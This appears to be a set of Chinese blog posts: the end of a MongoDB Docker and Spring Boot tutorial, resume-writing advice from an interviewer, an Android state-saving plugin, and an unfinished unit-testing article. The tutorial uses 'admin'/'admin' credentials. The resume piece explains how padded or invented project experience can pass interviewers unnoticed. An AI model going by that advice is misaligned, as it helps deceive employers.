Setp1：装载容器
我们还是用之前下载的镜像，重新装载一个容器实例，命令如下：

docker run --name mongodb2 -p 27019:27017 -d mongo:latest --auth

其中“--auth”就是开启身份认证。
装载完身份认证成功容器之后，我们需要进入容器内部，给MongoDB设置用户名和密码。
Setp2：进入容器内部

docker exec -it  bash

Setp3：进入mongo命令行模式

mongo admin

Setp4：创建用户

db.createUser({ user: 'admin', pwd: 'admin', roles: [ { role: "userAdminAnyDatabase", db: "admin" } ] });

创建的用户名为“admin”密码为“admin”，指定的数据库为“admin”。
这个时候，我们使用Robo 3T 输入相应的信息进行连接，如下图：

表示已经连接成功了。
1.3.4 创建数据库设置用户
上面我们用“admin”账户使用了系统数据库“admin”，通常在生成环境我们不会直接使用系统的数据库，这个时候我们需要自己创建自己的数据库分配相应的用户。
Setp1：首先需要进入容器

docker exec -it  bash

Setp2：创建数据库

use testdb

如果没有testdb就会自动创建数据库。
Setp3：创建用户分配数据库

db.createUser({ user: 'admin', pwd: 'admin', roles: [ { role: "readWrite", db: "testdb" } ] });

其中 role: "readWrite" 表式给用户赋值操作和读取的权限，当然增加索引、删除表什么的也是完全没有问题的。
到目前为止我们就可以使用admin/admin操作testdb数据库了。
1.3.5 其他Docker命令
删除容器：docker container rm 
停止容器：docker stop 
启动容器：docker start 
查看运行是容器：docker ps
查询所有的容器：docker ps -a
二、MyBatis集成MongoDB
Spring Boot项目集成MyBatis前两篇文章已经做了详细的介绍，这里就不做过多的介绍，本文重点来介绍MongoDB的集成。
Setp1：添加依赖
在pom.xml添加如下依赖：
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-mongodb</artifactId>
</dependency>
Setp2：配置MongoDB连接
在application.properties添加如下配置：
spring.data.mongodb.uri=mongodb://username:pwd@172.16.10.79:27019/testdb
Setp3：创建实体类
import java.io.Serializable;

public class User implements Serializable {
    private Long id;
    private String name;
    private int age;
    private String pwd;
    //...略set、get
}

Setp4：创建Dao类
import com.hello.springboot.entity.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.data.mongodb.core.query.Update;
import org.springframework.stereotype.Component;
import java.util.List;

@Component
public class UserDao {
    @Autowired
    private MongoTemplate mongoTemplate;
    /**
     * 添加用户
     * @param user User Object
     */
    public void insert(User user) {
        mongoTemplate.save(user);
    }

    /**
     * 查询所有用户
     * @return
     */
    public List<User> findAll() {
        return mongoTemplate.findAll(User.class);
    }

    /**
     * 根据id 查询
     * @param id
     * @return
     */
    public User findById(Long id) {
        Query query = new Query(Criteria.where("id").is(id));
        User user = mongoTemplate.findOne(query, User.class);
        return user;
    }

    /**
     * 更新
     * @param user
     */
    public void updateUser(User user) {
        Query query = new Query(Criteria.where("id").is(user.getId()));
        Update update = new Update().set("name", user.getName()).set("pwd", user.getPwd());
        mongoTemplate.updateFirst(query, update, User.class);
    }

    /**
     * 删除对象
     * @param id
     */
    public void deleteUserById(Long id) {
        Query query = new Query(Criteria.where("id").is(id));
        mongoTemplate.remove(query, User.class);
    }

}

Setp4：创建Controller
import com.hello.springboot.dao.IndexBuilderDao;
import com.hello.springboot.dao.UserDao;
import com.hello.springboot.entity.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

@RestController
@RequestMapping("/")
public class UserController {
    @Autowired
    private UserDao userDao;

    @RequestMapping("/")
    public ModelAndView index() {
        User user = new User();
        user.setId(new Long(1));
        user.setAge(18);
        user.setName("Adam");
        user.setPwd("123456");
        userDao.insert(user);

        ModelAndView modelAndView = new ModelAndView("/index");
        modelAndView.addObject("count", userDao.findAll().size());
        return modelAndView;
    }
}

Setp5：创建页面代码
<html>
<head>
    <title>王磊的博客</title>
</head>
<body>
Hello ${count}
</body>
</html>
到此为止已经完成了MongoDB的集成，启动项目，输入“http://localhost:8080/”去数据库查看插入的数据吧。
正常插入数据库如下图：

三、MongoDB主键自增
细心的用户可能会发现，虽然MongoDB已经集成完了，但插入数据库的时候user的id是手动set的值，接下来我们来看怎么实现MongoDB中的id自增。
3.1 实现思路
MongoDB 实现id自增和Spring Boot JPA类似，是在数据库创建一张表，来记录表的“自增id”，只需要保证每次都增加的id和返回的id的原子性，就能保证id实现“自增”的功能。
3.2 实现方案
有了思路之后，接下来我们来看具体的实现方案。
3.2.1 创建实体类
import org.springframework.data.annotation.Id;
import org.springframework.data.mongodb.core.mapping.Document;

@Document(collection = "IndexBuilder")
public class IndexBuilder {
    @Id
    private String id;
    private Long seq;
    //..省略get、set方法
}
其中collection = "IndexBuilder"是指数据库的集合名称，对应关系型数据库的表名。
3.2.2 创建Dao类
import com.hello.springboot.entity.IndexBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoOperations;
import org.springframework.data.mongodb.core.query.Update;
import org.springframework.stereotype.Component;
import static org.springframework.data.mongodb.core.FindAndModifyOptions.options;
import static org.springframework.data.mongodb.core.query.Criteria.where;
import static org.springframework.data.mongodb.core.query.Query.query;

@Component
public class IndexBuilderDao {
    @Autowired
    private MongoOperations mongo;
    /**
     * 查询下一个id
     * @param collectionName 集合名
     * @return
     */
    public Long getNextSequence(String collectionName) {
        IndexBuilder counter = mongo.findAndModify(
                query(where("_id").is(collectionName)),
                new Update().inc("seq", 1),
                options().returnNew(true).upsert(true),
                IndexBuilder.class);
        return counter.getSeq();
    }
}
3.2.3 使用“自增”的id
User user = new User();
user.setId(indexBuilderDao.getNextSequence("user"));
//...其他设置
核心代码：indexBuilderDao.getNextSequence("user") 使用“自增”的id，实现id自增。
到此为止，已经完成了MongoDB的自增功能，如果使用正常，数据库应该是这样的：

数据库的IndexBuilder就是用来记录每个集合的“自增id”的。
MongoDB集成的源码：https://github.com/vipstone/springboot-example/tree/master/springboot-mybatis-mongodb

********************************************************************************************************************************************************************************************************
再论面试前准备简历上的项目描述和面试时介绍项目的要点
    前几天我写了篇文章，在做技术面试官时，我是这样甄别大忽悠的——如果面试时你有这样的表现，估计悬，得到了大家的广泛关注，一度上了最多评论榜。不过，也收到了4个反对，也有有朋友说：”简直不给人活路！”，我可以想象是哪些朋友给的反对。
   由于项目介绍是面试中的重头戏，一些技术问题会围绕你介绍的项目展开，你也可以在介绍项目时亮出你的优势。所以，在准备面试的时候，你可以刷题，但首先得准备好你的项目介绍，因为这关系到你面试的成败，文本就将围绕这点展开。
    如果在简历中的项目经验是真实的，那么本文给出的技巧一定能提升面试官对你的评价，毕竟你不仅要能力强，更要让面试官感觉出这点。如果你的项目经历是虚构的，那么我也不能阻止你阅读本文。如果你用虚构的项目经验外加你的（忽悠）本事外加本文给出的技巧进了某个公司，我想这个公司的面试官也怨不到我头上，毕竟面试技术是中立的，就看被谁用。
     开场白结束，正文开始。
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
1 面试前，回顾下你最近的项目经验，在对比下职位介绍，在简历中多列些契合点
    比如某个职位介绍里，要求候选人有Spring Boot相关经验，数据库要会Oracle，而且需要有分布式组件，比如nginx，dubbo等的相关经验，那么你就得回顾下你上个或之前的项目，是否用到过同样的或类似的技术，如果有，那么就得加到简历上，这些技术无需在简历上展开，但得结合项目具体需求写。
    一般的写法，在项目里，我用到了dubbo，redis等的技术。 
    比较好的写法，在项目里的订单管理模块里，我们是用dubbo的方式调用了客户管理系统里的方法，调用的时候我们还考虑到了超时等的异常情况。在页面展示部分，我们用redis缓存了商品信息，redis是用主从热备。
    对比上述两种写法，很明显，第二种写法明显更有说服力，因为其中列出了只有用过才知道的点，这样就能向面试官证明你确实用过相关技术。
    类似的，在职位介绍里提到的技术，最好都用同样的方法写到简历中。不过这里请注意，过犹不及，比如职位介绍里提到了5个技术，你用到了其中的3个，那么你本来也可以通过面试。但如果你自己在项目里拼接了一个实际没用到的技术，那么你就得自己承担后果了。 
2 能帮到你的其实是和职位相关的商业项目经验（含简历疑点和如何避免）
    在本文开头提到的这篇文章里，我已经分享过甄别商业项目的方法。这里我通过些假装商业项目的案例来作为反面教材，以此来说明商业项目经验该怎么描述。
    1 小A，3本学校毕业，计算机系，2年相关经验，之前的公司是一个名不见经传的公司，也就叫xx科技公司，但描述的项目却很高大上，是xx ERP项目。疑点分析：如果某大型公司，或国企，要做ERP或之类的大型项目，或者自己开发，或者让别的大公司开发（因为能出得起这个钱），如果是小公司要用，估计也就拿别人的现成的代码来改，一般不会出这个钱，所以遇到人经历少，公司规模小但项目很有名头的简历，我不能说是一律排除，但我会问很细。
    2 小B，2本计算机系，3年经验，但最近有3个月工作断档的记录。之前的公司是个软件公司，但并非是一个互联网公司，但简历上写的技术非常新潮，比如分布式缓存，dubbo之类的，而且用到了集群。还是这句话，技术是为成本服务，你上个项目规模不大，也不可能有高并发的流量，那么为什么要用这些技术？
    遇到这类简历，我就找些用过就一定能知道的问题来问，比如Redis的基本数据结构，redis如何部署，如何看redis日志，在上述案例中，我就通过这个方法发现该项目其实是个学习项目，而且这个项目是在培训学校里学的。
    3 小C，最近简历上写的是个xx系统（大家可以理解成金融物流保险等），但时间跨度比较可疑，一般来说，做个系统至少10个人左右，而且得大半年，但他简历上写的参与时间是3个月，这和培训学校里的学习时间非常相近。而且，在简历中写的是自己开发了xx系统里的xx模块，用到了redis，logstash等技术。这类简历的疑点是，第一，用了3个月完成了一个项目，而且该项目里有高新技术，且做好了以后马上离职了，这个和实际情况不符，很像培训项目。
    其实简历的疑点不止上述三个，大家也可以换位思考下，如果你是面试官，看到这份简历，会相信吗？很多疑点其实很明显。
    下面我说下真实项目里会出现的情况，写这些内容的目的不是让有些同学把学习项目和培训项目往商业项目上靠，而是让大家的简历更具备说服力。
    1 工作年限比较少的同学，未必会开发完成一个模块或参与一个项目的开发，更多场景下是参与一个维护项目，比如公司一个项目已经上线了，这个项目是历史项目，所以用的技术未必最新，但在维护项目里，其实也会开发一些功能点，该用的技术一个不会少，针对每个模块维护的时间周期也不会太长，比如每个月，针对某个模块上线3个功能点，这样也是合情合理的。
    2 还是这句话，如果有用到比较新的技术，结合业务场景写，比如用到了redis，你是缓存了哪类业务数据，这类业务数据的特点如果真的是符合缓存条件的，那么就加深了你熟悉这个技术的可信度。
    3 你站在项目经理的角度想一下，某个功能如果工期很紧，而且数据量和并发量真的不大，那么为什么要用分布式组件？换句话说，如果你在简历里写的项目背景里，有高并发请求，那么引入分布式组件的可信度就高了。而且，项目经理会让一个工作经验不足的人独立使用技术含量高的组件吗？如果候选人工作经验不多，那么比较可信的描述是，由架构师搭建好组件框架，本人用到其中一些API，但用的时候，对该组件的流程和技术坑非常了解，那么以此证明自己对该组件比较熟悉，这样可信度就非常高了。
     换句话说，你写好简历里的项目描述后，自己先读一遍，如果有夸张的成分，更得多推敲，除了个别虚假简历之外，很多情况下，其实简历是真实的，但没写好，有很多漏洞，被面试官一质疑就慌了，导致面试官认为简历不真实。     
3 沉浸入项目角色，多列些项目管理工具和技术使用细节（就是坑）
    其实证明相关项目经验是商业项目，这仅仅是第一步，更多的时候，你得通过简历中的项目描述，证明你的技能和职位描述相匹配，再进一步，你也可以证明你确实用过一些比较值钱的技术。
    对于项目开发而言，只要项目是真实的，你就一定会经历过一些场景，对于技术而言，只要你用到了，那么一定能说出些“海底针”。所以在写简历时，建议大家列些如下的关键点，以证实真实性。
    1 项目的背景，多少人做？做了多久？用什么工具打包部署发布（比如ant加jenkins）？用到哪些测试工具？用什么来进行版本管理（比如Maven+JIra）？如何打印日志（比如logger）？部署环境时，用到哪个web服务器和数据库（比如spring boot+oracle）。
     这些话在简历中一笔带过也用不了多少文字，但这样不仅能提升项目的真实性，更能展示你的实际技能。
    2 项目的开发模式和开发周期，比如用敏捷开发，那么每一个月作为一个周期，每次发布个若干功能，在每个周期发布前几天，会冻结开发，在开发过程中，会有每天的站会，代码开发完成后，会有code review。
    3  在写技术（尤其是值钱技术）描述时，最好写些细节，比如用到了dubbo，那么可以写需要设置dubbo超时时间和重试次数是1，否则可能会出现调用，如果用到了线程池，那么如何避免线程池中的OOM问题，或者用到了nginx，你就把配置文件里的关键要素写些出来。
    也就是说，你写技术时，不仅得结合项目需求写（即xx技术实现了xx功能），最好再些一些（不用太多）这个技术的用法细节（也未必太深）。面试官其实就看你用到的技术是否和职位匹配，如果职位介绍里的技术点你有都招这点要求写了，至少在筛选简历的时候，你过关的可能性就很大了。
    4 最好写些你解决的实际问题，大而言之，实际问题可以包括配置集群时的要点（比如一定要设置某个配置），小而言之，你可以写如何实现一个功能（比如出统计报表时，你用到了数据库里的行转列的功能）。哪怕是学习项目和培训项目，你运行通现有代码的时候，也会遇到各类的坑，这就更不用说商业项目了。在简历里项目描述部分，你就写上一两个，这样证明真实性的力度绝对会非常高。
    5 加上单元测试和分析问题和排查问题的描述。
      比如，在这个系统里，我是用SoapUI作为自测的工具（或者用JUnit），在测试环境上，如果出现问题，我会到linux里，用less等命令查看日志，再用JMeter等工具查看JVM的调用情况，以此来排查问题。
    这种话在简历中写下大概的描述，给出关键字（比如Jmeter,SOAPUI或职位介绍里出现的关键字）即可，不用展开，但在面试前要准备说辞。
    我知道有些候选人会对项目描述做些改动，比如在最近的项目描述里，加上些之前项目里用到的技术，或者加上职位描述里提到的技术。在这种做法是否恰当，大家自己评估，但如果你在这类技术描述里，加上本部分提到的一些要点，面试官就很难甄别了。
4 事先得排练介绍项目的说辞，讲解时，一定得围绕职位需求要点
    这里说句题外话，我面试过的候选人，从他们的表现来看，很多人是不准备项目描述的，是想到哪说到哪，这样的话，如果你准备了，和你的竞争者相比，你就大占优势了。
    在本文的第3部分里，我给出了5个方面，在简历里，你未必要写全，但在准备面试说辞时，你一定得都准备。
    1 你在项目描述里列到的所有技术点，尤其是热门的以及在职位介绍里提到的技术点，你一定得准备说辞。也是按“技术如何服务需求”以及“技术实现细节”来说，更进一步，你最好全面了解下这个技术的用法。比如nginx如何实现反向代理，该如何设置配置以及lua脚本，如果分布式系统里某个结点失效了，我想在反向代理时去掉，那该怎么在nginx配置里设。针对这个技术的常用问题点，你最好都准备下。
    2 介绍项目时，可以介绍用到哪些技术，但别展开，等面试官来问，所谓放长线钓大鱼。这个效果要比你直接说出来要好很多。
    3 有些基础的技能需求，在职位描述里未必会列，但你一定得掌握。比如通过设计模式优化代码架构，熟悉多线程并发，熟悉数据库调优等。关于这些，你可以准备些说辞，比如在这个项目里，遇到sql过长的情况，我会通过执行计划来调优，如果通过日志发现JVM性能不高，我也能排查问题，然后坐等面试官来问。
   4 开阔你的视野，别让面试官感觉你只会用非常初步的功能点。比如你项目里用到了dubbo，但在项目里，你就用到了简单的调用，那么你就不妨搜下该技术的深入技术以及别人遇到的坑，在面试过程中，你也可以找机会说出来。
5 在项目介绍时多准备些“包袱”
    刚才也提到了，在介绍项目里，你可以抛些亮点，但未必要展开，因为介绍项目时，你是介绍整体的项目以及用到的技术，如果你过于偏重介绍一个技术，那么面试官不仅会认为你表达沟通方面有问题，而且还会认为这个技术你事先准备过。
    如下列些大家可以抛出的亮点：
    1 底层代码方面，大家可以说，了解Spring IOC或Nginx（或其它任何一个职位介绍里提到的技术）的底层实现代码。面试时，大家可以先通过UML图的形式画出该技术的重要模块和过程流程，再通过讲述其中一个模块的代码来说明你确实熟悉这个技术的底层实现。
    2 数据库调优方面。比如oracle，你可以用某个长SQL为例，讲下你通过执行计划看到有哪些改进点，然后如何改进，这样的例子不用多，2,3个即可，面试时估计面试官听到其中一个以后就会认为你非常熟悉数据调优了。
   3 JVM调优和如何通过设计模式改善代码结构，在Java核心技术及面试指南里我已经提到了，这里就不展开了。
   4 架构层面的调优方法，比如通过分库分表，通过数据库集群，或者通过缓存。
   其实关于亮点的内容，我在Java Web轻量级开发面试教程里，也有详细描述。这里想说的是，大家可以准备的亮点绝不止上述4个，大家可以从调优（比如通过分布式优化并发情况场景）和技术架构（比如SSM， 分布式消息队列）上准备。再啰嗦一句，职位介绍里提到的技能点，比如Redis，大家还可以用熟悉底层实现代码来作为“亮点”，比如介绍项目时，轻描淡写地说句，我熟悉Redis底层代码（当然也可以写到简历上），然后等面试官来问时，动笔说下。 
6 别让面试官感觉你只会使用技术
    按照上述的建议，只要你能力可以（哪怕可上可下），你通过技术面试的可能性就大大增加了。但面试时，如果你表现出如下的软实力，比如在简历上项目描述部分写上，或介绍项目时说出，那么面试官甚至会感觉你很优秀。
    1 该项目的工期比较紧，我会合理安排时间，必要时，我会在项目经理安排下周末加班。（体现你的责任心）
    2 这个项目里，用到了分布式组件技术，刚开始我对此不熟悉，但我会主动查资料，遇到问题，我会及时问架构师，解决问题后，我会主动在组内分享。（有责任心，学习能力强，有团队合作意识，有分享精神）
    3 遇到技术上或需求上的疑点或是我个人无法完成问题点，我会主动上报，不会坐等问题扩大。
    4 在开发项目的过程中，通过学习，我慢慢掌握了Git+Ant+Jeninks的打包发布部署流程，现在，我会负责项目里的打包工作。或者说，在组内，我会每天观察长SQL脚本和长Dubbo调用的情况，如果遇到问题，我会每天上报，然后大家一起解决问题。（不仅能完成本职工作，而且还能积极分担项目组里的其它工作）
    5 如果出现问题，我主动会到linux里通过xxx命令查看日志，然后排查问题。（不仅积极主动，而且掌握了排查问题的方法）
    6 我会和测试人员一起，用xxx工具进行自动化测试，出现问题然后一起解决。（工作积极，而且掌握了测试等的技巧）
    7 在项目里，我会用Sonar等工具扫描代码，出现质量问题，我会和大家一起协商改掉。（具有代码质量管理的意识，而且具有提升代码质量的能力）
 
7 版权说明，总结，求推荐
    本文欢迎转载，转载前请和本人说下，请全文转载并用链接的方式指明原出处。
    本文给出的准备项目描述和说辞的经验，是根据本人以及其它多位资深技术面试官的经验总结而来。如果大家感觉本文多少有帮助，请点击下方的推荐按钮，您的推荐是我写博客的最大动力。如果大家在这方面有问题，可以通过评论问或私下给我发消息，一般我都会回。
********************************************************************************************************************************************************************************************************
不需要再手写 onSaveInstanceState 了，因为你的时间非常值钱
如果你是一个有经验的 Android 程序员，那么你肯定手写过许多 onSaveInstanceState 以及 onRestoreInstanceState 方法用来保持 Activity 的状态，因为 Activity 在变为不可见以后，系统随时可能把它回收用来释放内存。重写 Activity 中的 onSaveInstanceState 方法 是 Google 推荐的用来保持 Activity 状态的做法。

Google 推荐的最佳实践
onSaveInstanceState 方法会提供给我们一个 Bundle 对象用来保存我们想保存的值，但是 Bundle 存储是基于 key - value 这样一个形式，所以我们需要定义一些额外的 String 类型的 key 常量，最后我们的项目中会充斥着这样代码：
static final String STATE_SCORE = "playerScore";
static final String STATE_LEVEL = "playerLevel";
// ...


@Override
public void onSaveInstanceState(Bundle savedInstanceState) {
    // Save the user's current game state
    savedInstanceState.putInt(STATE_SCORE, mCurrentScore);
    savedInstanceState.putInt(STATE_LEVEL, mCurrentLevel);

    // Always call the superclass so it can save the view hierarchy state
    super.onSaveInstanceState(savedInstanceState);
}
保存完状态之后，为了能在系统重新实例化这个 Activity 的时候恢复先前被系统杀死前的状态，我们在 onCreate 方法里把原来保存的值重新取出来：
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState); // Always call the superclass first

    // Check whether we're recreating a previously destroyed instance
    if (savedInstanceState != null) {
        // Restore value of members from saved state
        mCurrentScore = savedInstanceState.getInt(STATE_SCORE);
        mCurrentLevel = savedInstanceState.getInt(STATE_LEVEL);
    } else {
        // Probably initialize members with default values for a new instance
    }
    // ...
}
当然，恢复这个操作也可以在 onRestoreInstanceState 这个方法实现：
public void onRestoreInstanceState(Bundle savedInstanceState) {
    // Always call the superclass so it can restore the view hierarchy
    super.onRestoreInstanceState(savedInstanceState);

    // Restore state members from saved instance
    mCurrentScore = savedInstanceState.getInt(STATE_SCORE);
    mCurrentLevel = savedInstanceState.getInt(STATE_LEVEL);
}
解放你的双手
上面的方案当然是正确的。但是并不优雅，为了保持变量的值，引入了两个方法 ( onSaveInstanceState 和 onRestoreInstanceState ) 和两个常量 ( 为了存储两个变量而定义的两个常量，仅仅为了放到 Bundle 里面)。
为了更好地解决这个问题，我写了 SaveState 这个插件：

在使用了 SaveState 这个插件以后，保持 Activity 的状态的写法如下：
public class MyActivity extends Activity {

    @AutoRestore
    int myInt;

    @AutoRestore
    IBinder myRpcCall;

    @AutoRestore
    String result;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // Your code here
    }
}
没错，你只需要在需要保持的变量上标记 @AutoRestore 注解即可，无需去管那几个烦人的 Activity 回调，也不需要定义多余的 String 类型 key 常量。
那么，除了 Activity 以外，Fragment 能自动保持状态吗？答案是： Yes！
public class MyFragment extends Fragment {

    @AutoRestore
    User currentLoginUser;

    @AutoRestore
    List<Map<String, Object>> networkResponse;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        // Your code here
    }
}
使用方法和 Activity 一模一样！不止如此，使用场景还可以推广到 View， 从此，你的自定义 View，也可以把状态保持这个任务交给 SaveState ：
public class MyView extends View {

    @AutoRestore
    String someText;

    @AutoRestore
    Size size;

    @AutoRestore
    float[] myFloatArray;

    public MainView(Context context) {
        super(context);
    }

    public MainView(Context context, @Nullable AttributeSet attrs) {
        super(context, attrs);
    }

    public MainView(Context context, @Nullable AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
    }

}
现在就使用 SaveState
引入 SaveState 的方法也十分简单：
首先，在项目根目录的 build.gradle 文件中增加以下内容：
buildscript {

    repositories {
        google()
        jcenter()
    }
    dependencies {
        // your other dependencies

        // dependency for save-state
        classpath "io.github.prototypez:save-state:${latest_version}"
    }
}
然后，在 application 和 library 模块的 build.gradle 文件中应用插件：
apply plugin: 'com.android.application'
// apply plugin: 'com.android.library'
apply plugin: 'save.state'
万事具备！再也不需要写烦人的回调，因为你的时间非常值钱！做了一点微小的工作，如果我帮你节省下来了喝一杯咖啡的时间，希望你可以帮我点一个 Star，谢谢 :)
SaveState Github 地址：https://github.com/PrototypeZ/SaveState

********************************************************************************************************************************************************************************************************
持续集成之单元测试篇——WWH(讲讲我们做单元测试的故事)
持续集成之单元测试篇——WWH(讲讲我们做单元测试的故事)
前言

临近上线的几天内非重大bug不敢进行发版修复，担心引起其它问题(摁下葫芦浮起瓢)
尽管我们如此小心，仍不能避免修改一些bug而引起更多的bug的现象
往往有些bug已经测试通过了但是又复现了
我们明明没有改动过的功能，却出了问题
有些很明显的bug往往在测试后期甚至到了线上才发现，而此时修复的代价极其之大。
测试时间与周期太长并且质量得不到保障
项目与服务越来越多，测试人员严重不足（后来甚至一个研发两个测试人员比）
上线的时候仅仅一轮回归测试就需要几个小时甚至更久
无休止的加班上线。。。

如果你对以上问题非常熟悉，那么我想你的团队和我们遇到了相同的问题。
WWH:Why,What,How为什么要做单元测试，什么事单元测试，如何做单元测试。
一、为什么我们要做单元测试
1.1 问题滋生解决方案——自动化测试
    一门技术或一个解决方案的诞生的诞生，不可能凭空去创造，往往是问题而催生出来的。在我的.NET持续集成与自动化部署之路第一篇(半天搭建你的Jenkins持续集成与自动化部署系统)这篇文章中提到，我在做研发负责人的时候饱受深夜加班上线之苦，其中提到的两个大问题一个是部署问题，另一个就是测试问题。部署问题，我们引入了自动化的部署(后来我们做到了几分钟就可以上线)。我们要做持续集成，剩下的就是测试问题了。

    回归测试成了我们的第一大问题。随着我们项目的规模与复杂度的提升，我们的回归测试变得越来越困难。由于我们的当时的测试全依赖手工测试，我们项目的迭代周期大概在一个月左右，而测试的时间就要花费一半多的时间。甚至版本上线以后做一遍回归测试就需要几个小时的时间。而且这种手工进行的功能性测试很容易有遗漏的地方，因此线上Bug层出不穷。一堆问题困扰着我们，我们不得不考虑进行自动化的测试。
    自动化测试同样不是银弹，自动化测试虽然与手工测试相比有其优点，其测试效率高，资源利用率高(一般白天开发写用例，晚上自动化程序跑)，可以进行压力、负载、并发、重复等人力不可完成的测试任务，执行效率较快，执行可靠性较高，测试脚本可重复利用，bug及时发现.......但也有其不可避免的缺点，如:只适合回归测试，开发中的功能或者变更频繁的功能，由于变更频繁而不断更改测试脚本是不划算的，并且脚本的开发也需要高水平的测试人员和时间......总体来说，虽然自动化的测试可以解决一部分的问题，但也同样会带来另一些问题。到底应该不应该引入自动化的测试还需要结合自己公司的团队现状来综合考虑。
    而我们的团队从短期来看引入自动化的测试其必然会带来一些问题，但长远来看其优点还是要大于其缺陷的，因此我们决定做自动化的测试，当然这具体是不是另一个火坑还需要时间来判定！
1.2 认识自动化测试金字塔

    以上便是经典的自动化测试金字塔。
    位于金字塔顶端的是探索性测试，探索性测试并没有具体的测试方法，通常是团队成员基于对系统的理解，以及基于现有测试无法覆盖的部分，做出系统性的验证，譬如：跨浏览器的测试,一些视觉效果的测试等。探索性测试由于这类功能变更比较频繁，而且全部实现自动化成本较高，因此小范围的自动化的测试还是有效的。而且其强调测试人员的主观能动性，也不太容易通过自动化的测试来实现，更多的是手工来完成。因此其成本最高，难度最大，反馈周期也是最慢的。
    而在测试金字塔的底部是单元测试,单元测试是针对程序单元的检测，通常单元测试都能通过自动化的方式运行,单元测试的实现成本较低，运行效率较高，能够通过工具或脚本完全自动化的运行，此外，单元测试的反馈周期也是最快的，当单元测试失败后,能够很快发现，并且能够较容易的找到出错的地方并修正。重要的事单元测试一般由开发人员编写完成。(这一点很重要，因为在我这个二线小城市里，能够编写代码的测试人员实在是罕见！)
    在金字塔的中间部分，自底向上还包括接口(契约)测试，集成测试，组件测试以及端到端测试等，这些测试侧重点不同，所使用的技术方法工具等也不相同。
    总体而言，在测试金字塔中，从底部到顶部业务价值的比重逐渐增加，即越顶部的测试其业务价值越大，但其成本也越来越大，而越底部的测试其业务价值虽小，但其成本较低，反馈周期较短，效率也更高。
1.3 从单元测试开始
    我们要开始做自动化测试，但不可能一下子全都做(考虑我们的人力与技能也做不到)。因此必须有侧重点，考虑良久最终我们决定从单元测试开始。于是我在刚吃了自动化部署的螃蟹之后，不得不来吃自动化测试的第一个螃蟹。既然决定要做，那么我们就要先明白单元测试是什么？
二、单元测试是什么
2.1 什么是单元测试。
    我们先来看几个常见的对单元测试的定义。
    用最简单的话说：单元测试就是针对一个工作单元设计的测试，这里的“工作单元”是指对一个工作方法的要求。
    单元测试是开发者编写的一小段代码，用于检测被测代码的一个很小的、很明确的功能是否正确。通常而言，一个单元测试用于判断某个特定条件(或场景)下某个特定函数的行为。
例：
    你可能把一个很大的值放入一个有序list中去，然后确认该值出现在list的尾部。或者，你可能会从字符串中删除匹配某种模式的字符，然后确认字符串确实不再包含这些字符了。
执行单元测试，就是为了证明某段代码的行为和开发者所期望的一致！
2.2 什么不是单元测试
    这里我们暂且先将其分为三种情况
2.2.1 跨边界的测试
    单元测试背后的思想是，仅测试这个方法中的内容，测试失败时不希望必须穿过基层代码、数据库表或者第三方产品的文档去寻找可能的答案！
    当测试开始渗透到其他类、服务或系统时，此时测试便跨越了边界，失败时会很难找到缺陷的代码。
    测试跨边界时还会产生另一个问题，当边界是一个共享资源时，如数据库。与团队的其他开发人员共享资源时，可能会污染他们的测试结果！
2.2.2 不具有针对性的测试
    如果发现所编写的测试对一件以上的事情进行了测试，就可能违反了“单一职责原则”。从单元测试的角度来看，这意味着这些测试是难以理解的非针对性测试。随着时间的推移，向类或方法种添加了更多的不恰当的功能后，这些测试可能会变的非常脆弱。诊断问题也将变得极具有挑战性。
    如：StringUtility中计算一个特定字符在字符串中出现的次数，它没有说明这个字符在字符串中处于什么位置也没有说明除了这个字符出现多少次之外的其他任何信息，那么这些功能就应该由StringUtility类的其它方法提供！同样，StringUtility类也不应该处理数字、日期或复杂数据类型的功能！
2.2.3 不可预测的测试
    单元测试应当是可预测的。在针对一组给定的输入参数调用一个类的方法时，其结果应当总是一致的。有时，这一原则可能看起来很难遵守。例如：正在编写一个日用品交易程序，黄金的价格可能上午九时是一个值，14时就会变成另一个值。
    好的设计原则就是将不可预测的数据的功能抽象到一个可以在单元测试中模拟(Mock)的类或方法中(关于Mock请往下看)。
三、如何去做单元测试
3.1 单元测试框架
    在单元测试框架出现之前，开发人员在创建可执行测试时饱受折磨。最初的做法是在应用程序中创建一个窗口，配有"测试控制工具(harness)"。它只是一个窗口，每个测试对应一个按钮。这些测试的结果要么是一个消息框，要么是直接在窗体本身给出某种显示结果。由于每个测试都需要一个按钮，所以这些窗口很快就会变得拥挤、不可管理。
由于人们编写的大多数单元测试都有非常简单的模式：

执行一些简单的操作以建立测试。
执行测试。
验证结果。
必要时重设环境。

于是，单元测试框架应运而生(实际上就像我们的代码优化中提取公共方法形成组件)。
    单元测试框架(如NUnit)希望能够提供这些功能。单元测试框架提供了一种统一的编程模型，可以将测试定义为一些简单的类，这些类中的方法可以调用希望测试的应用程序代码。开发人员不需要编写自己的测试控制工具；单元测试框架提供了测试运行程序(runner)，只需要单击按钮就可以执行所有测试。利用单元测试框架，可以很轻松地插入、设置和分解有关测试的功能。测试失败时，测试运行程序可以提供有关失败的信息，包含任何可供利用的异常信息和堆栈跟踪。
​ .Net平台常用的单元测试框架有：MSTesting、Nunit、Xunit等。
3.2 简单示例(基于Nunit)
    /// <summary>
    /// 计算器类
    /// </summary>
    public class Calculator
    {
        /// <summary>
        /// 加法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Add(double a, double b)
        {
            return a + b;
        }

        /// <summary>
        /// 减法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Sub(double a, double b)
        {
            return a - b;
        }

        /// <summary>
        /// 乘法
        /// </summary>
        /// <param name="a"></param>
        /// <param name="b"></param>
        /// <returns></returns>
        public double Mutiply(double a, double b)
        {
